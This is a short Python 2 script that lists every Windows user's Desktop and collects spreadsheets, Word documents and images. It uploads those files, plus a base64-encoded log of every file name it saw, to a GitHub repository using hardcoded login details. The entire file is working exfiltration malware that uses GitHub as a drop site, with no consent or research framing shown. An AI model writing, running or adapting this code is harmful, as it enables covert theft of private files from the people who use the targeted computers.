import os
import os.path as path
from github3 import login
import base64
import random

def connect_to_github():  
    gh=login(username="doctor305",password="<password>")  
    repo=gh.repository("doctor305","test")  
    branch=repo.branch("master")  
    return gh,repo,branch
  
def store_data_b64(data,remote_path):  
    gh,repo,branch=connect_to_github()  
    #remote_path = "data/test.data"  
    repo.create_file(remote_path,"Commite message",base64.b64encode(data))  
    print "upload success"  
    return
def store_data(data,remote_path):  
    gh,repo,branch=connect_to_github()  
    #remote_path = "data/test.data"  
    repo.create_file(remote_path,"Commite message",data)  
    print "upload success"  
    return

def searchdesktop(log_name):
    userlist_unuse = ('All Users', 'Default', 'Default User','Public')
    userlist = os.listdir('C:\\Users')
    fileformat = ('.xls','.xlsx','.doc','.docx','.jpg','.gif')

    f = open(log_name,'w')
    f.write('os is : '+os.name+'\n')
    print userlist
    for user in userlist:
        if user not in userlist_unuse and path.exists('C:\\Users'+os.sep+user):
            f.write('user: '+user+'\n')
            if  path.isdir('C:\\Users'+os.sep+user+os.sep+'Desktop'):
                for filename in os.listdir('C:\\Users'+os.sep+user+os.sep+'Desktop'):
                    f.write(filename+',')
                    if path.splitext(filename)[1] in  fileformat:
                        print "Send this file! "
                        f.write("Send this file! \n")
                        full_file_name = 'C:\\Users'+os.sep+user+os.sep+'Desktop'+os.sep+filename
                        try:
                            with open(full_file_name,'rb') as f_temp:
##                                if not path.exists('temp'):
##                                    os.mkdir('temp')
##                                with open('temp'+os.sep+str(random.randint(100,999))+filename,'wb') as f_save_file:
##                                    f_save_file.write(f_temp.read())
                                store_data(f_temp.read(),'file/'+filename)
                        except:
                            f.write('This file is being used. ')
                
            f.write('End\n')
    f.close()
    with open(log_name,'r') as senddate:
        store_data_b64(senddate.read(),'log/log.txt')

if __name__ == '__main__':
    searchdesktop('log.txt')
